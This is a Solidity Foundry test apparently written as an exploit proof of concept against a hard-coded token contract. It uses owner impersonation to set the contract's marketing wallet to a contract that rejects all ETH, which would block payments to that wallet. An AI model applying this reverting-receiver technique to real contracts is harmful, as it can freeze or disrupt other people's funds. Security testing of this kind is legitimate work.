// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IKorban {
    function owner() external view returns (address);
    function marketingWallet() external view returns (address);
    function changeMarketingWallet(address _marketingWallet) external;
}

contract RevertingContract {
    receive() external payable {
        revert("Funds rejected");
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xD8dBE5AC60cD1c0b40C9182cB3eB2392d3df371F;
    address attacker = address(this);
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        owner = IKorban(TARGET).owner();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Deploy the malicious contract that will revert on receiving funds
                RevertingContract revertingContract = new RevertingContract();
                address maliciousWallet = address(revertingContract);

                // Impersonate the owner to change the marketing wallet
                vm.prank(owner);
                IKorban(TARGET).changeMarketingWallet(maliciousWallet);

                // Verify that the marketing wallet is now our malicious contract
                assertEq(IKorban(TARGET).marketingWallet(), maliciousWallet);
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

